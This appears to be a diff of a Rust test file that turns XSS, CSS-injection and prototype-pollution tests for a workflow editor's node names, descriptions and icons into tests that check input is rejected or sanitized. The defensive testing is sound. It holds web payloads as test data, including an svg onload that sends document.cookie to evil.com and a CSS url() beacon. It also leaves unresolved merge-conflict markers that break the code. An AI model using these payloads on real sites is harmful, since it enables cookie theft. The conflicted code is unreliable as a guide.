@@ -5,7 +5,7 @@
 //! CSS class injection, event handler abuse, HttpMethod::parse silent fallback.
 
 use vo_frontend::ui::domain_types::{HttpMethod, NodeTemplateId};
-use vo_frontend::ui::graph::{Node, NodeId, Workflow};
+use vo_frontend::ui::graph::{sanitize_text, validate_icon_name, validate_node_name, Node, NodeId, Workflow};
 use vo_frontend::ui::prototype_palette::{generate_skeleton, SketchNode};
 
 /// Helper: roundtrip a node name through JSON and assert the payload survives.
@@ -17,69 +17,118 @@ fn assert_name_roundtrip(payload: &str) {
 }
 
 #[test]
-fn xss_node_name_script_tag_survives_roundtrip() {
+fn xss_node_name_script_tag_rejected_at_construction() {
     let payload = r#"<script>alert('xss')</script>"#;
-    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
-    let json = serde_json::to_string(&node).expect("serialize");
     assert!(
-        json.contains("<script>"),
-        "XSS payload must survive serialization"
+        validate_node_name(payload).is_none(),
+        "script tag must be rejected as node name"
     );
-    let recovered: Node = serde_json::from_str(&json).expect("deserialize");
-    assert_eq!(recovered.name, payload, "XSS payload roundtrips verbatim");
+    assert!(
+        Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure).is_none(),
+        "Node::new must reject script tag in name"
+    );
 }
 
 #[test]
-fn xss_node_name_img_onerror() {
+fn xss_node_name_img_onerror_rejected() {
     let payload = r#"<img src=x onerror="alert(1)">"#;
-    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
-    let json = serde_json::to_string(&node).expect("serialize");
     assert!(
-        json.contains("onerror"),
-        "onerror payload survives serialization"
+        validate_node_name(payload).is_none(),
+        "img onerror must be rejected as node name"
     );
 }
 
 #[test]
-fn xss_node_description_with_iframe() {
-    let payload = r#"<iframe src="javascript:alert(document.cookie)"></iframe>"#;
-    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure);
-    node.description = payload.to_string();
-    let json = serde_json::to_string(&node).expect("serialize");
-    assert!(
-        json.contains("javascript:"),
-        "iframe payload survives serialization"
-    );
-}
-
-#[test]
-fn xss_node_name_svg_onload() {
+fn xss_node_name_svg_onload_rejected() {
     let payload = r#"<svg onload="fetch('https://evil.com?c='+document.cookie)">"#;
-    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
-    let json = serde_json::to_string(&node).expect("serialize");
-    assert!(json.contains("onload"), "svg onload payload survives");
+    assert!(
+        validate_node_name(payload).is_none(),
+        "svg onload must be rejected as node name"
+    );
 }
 
 #[test]
-fn css_injection_node_name_with_style() {
+fn css_injection_node_name_rejected() {
     let payload = r#""><style>body{background:url('https://evil.com/track?u=1')}</style>"#;
-    let node = Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure);
-    let json = serde_json::to_string(&node).expect("serialize");
     assert!(
-        json.contains("background:url"),
-        "CSS exfil payload survives"
+        validate_node_name(payload).is_none(),
+        "CSS exfil payload must be rejected as node name"
     );
 }
 
 #[test]
-fn css_injection_node_icon_field() {
-    let mut node = Node::new(NodeId::new(), "test".to_string(), vo_types::NodeKind::Pure);
-    node.icon = r#"expression(alert(1))"#.to_string();
-    let json = serde_json::to_string(&node).expect("serialize");
+fn xss_node_description_iframe_stripped() {
+    let payload = r#"Hello <iframe src="javascript:alert(document.cookie)"></iframe>"#;
+    let sanitized = sanitize_text(payload);
     assert!(
-        json.contains("expression("),
-        "CSS expression payload in icon"
+        !sanitized.contains("<iframe"),
+        "iframe tags must be stripped from description"
     );
+    assert!(
+        !sanitized.contains("javascript:"),
+        "javascript: must be stripped from description"
+    );
+    assert!(sanitized.contains("Hello"), "safe text must be preserved");
+}
+
+#[test]
+fn css_injection_node_icon_rejected() {
+    assert!(
+        validate_icon_name(r#"expression(alert(1))"#).is_none(),
+        "CSS expression payload must be rejected in icon"
+    );
+    assert!(
+        validate_icon_name(r#"<script>alert(1)</script>"#).is_none(),
+        "HTML in icon must be rejected"
+    );
+    assert!(
+        validate_icon_name(r#"javascript:alert(1)"#).is_none(),
+        "javascript: URI in icon must be rejected"
+    );
+}
+
+#[test]
+fn valid_node_names_accepted() {
+    assert!(validate_node_name("HTTP Handler").is_some());
+    assert!(validate_node_name("Durable Step").is_some());
+    assert!(validate_node_name("If / Else").is_some());
+    assert!(validate_node_name("my-node").is_some());
+    assert!(validate_node_name("test_node").is_some());
+    assert!(validate_node_name("Node 123").is_some());
+    assert!(validate_node_name("Hello (World)").is_some());
+    assert!(validate_node_name("a").is_some());
+}
+
+#[test]
+fn node_set_name_rejects_xss() {
+    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure).expect("valid");
+    assert!(!node.set_name(r#"<script>alert(1)</script>"#));
+    assert_eq!(node.name, "safe", "name must not change on invalid input");
+    assert!(node.set_name("new-safe-name"));
+    assert_eq!(node.name, "new-safe-name");
+}
+
+#[test]
+fn node_set_description_strips_html() {
+    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure).expect("valid");
+    node.set_description(r#"Hello <b>world</b> <script>alert(1)</script>"#);
+    assert!(
+        !node.description.contains("<"),
+        "no HTML tags must remain in description"
+    );
+    assert!(
+        !node.description.contains(">"),
+        "no HTML tags must remain in description"
+    );
+    assert!(node.description.contains("Hello world"), "safe text must be preserved");
+}
+
+#[test]
+fn node_set_icon_rejects_payloads() {
+    let mut node = Node::new(NodeId::new(), "safe".to_string(), vo_types::NodeKind::Pure).expect("valid");
+    assert!(!node.set_icon(r#"expression(alert(1))"#));
+    assert!(node.set_icon("rocket"));
+    assert_eq!(node.icon, "rocket");
 }
 
 #[test]
@@ -115,7 +164,6 @@ fn nodeid_rejects_path_traversal() {
 
 #[test]
 fn yaml_skeleton_uses_enum_type_not_user_label() {
-    // generate_skeleton uses node.node_type (enum Display), not user-controlled label
     let mut sketch = SketchNode::new(NodeTemplateId::Run);
     sketch.label = "legit\n  - type: evil-injected-step".to_string();
     let yaml = generate_skeleton(&[sketch]);
@@ -146,17 +194,17 @@ fn workflow_deserialization_rejects_truncated_json() {
 
 #[test]
 fn workflow_with_malicious_config_key() {
-    let mut node = Node::new(NodeId::new(), "ok".to_string(), vo_types::NodeKind::Pure);
+    let mut node = Node::new(NodeId::new(), "ok".to_string(), vo_types::NodeKind::Pure).expect("valid");
     let evil_config = serde_json::json!({
         "__proto__": {"admin": true},
         "constructor": {"prototype": {"polluted": true}}
     });
     node.apply_config_update(&evil_config);
-    // Must not panic — prototype pollution keys are just string keys in serde_json
     assert!(node.config.as_object().is_some());
     assert_eq!(node.config.as_object().map(|m| m.len()), Some(2));
 }
 
+<<<<<<< HEAD
 // ============================================================================
 // bh-004: Event handler XSS — signal ordering corruption via node names
 // ============================================================================
@@ -355,4 +403,34 @@ fn xss_event_handler_single_quote_attr_in_node_name() {
 fn xss_event_handler_no_quotes_attr_in_node_name() {
     let payload = "<img src=x onerror=alert(1)>";
     assert_name_roundtrip(payload);
+=======
+#[test]
+fn xss_node_name_with_closing_tag_breakout_rejected() {
+    let payload = r#"><img src=x onerror=alert(1)> "#;
+    assert!(validate_node_name(payload).is_none());
+    assert!(Node::new(NodeId::new(), payload.to_string(), vo_types::NodeKind::Pure).is_none());
+}
+
+#[test]
+fn xss_node_name_with_ampersand_entity_rejected() {
+    assert!(validate_node_name("foo&bar").is_none());
+    assert!(validate_node_name(r#"foo"bar"#).is_none());
+    assert!(validate_node_name("foo'bar").is_none());
+}
+
+#[test]
+fn xss_node_name_with_control_chars_rejected() {
+    assert!(validate_node_name("foo\x00bar").is_none());
+    assert!(validate_node_name("foo\x01bar").is_none());
+    assert!(validate_node_name("foo\x1fbar").is_none());
+}
+
+#[test]
+fn xss_node_name_empty_and_too_long_rejected() {
+    assert!(validate_node_name("").is_none());
+    let long = "a".repeat(257);
+    assert!(validate_node_name(&long).is_none());
+    let ok = "a".repeat(256);
+    assert!(validate_node_name(&ok).is_some());
+>>>>>>> origin/buzzard/ve-jp00n
 }
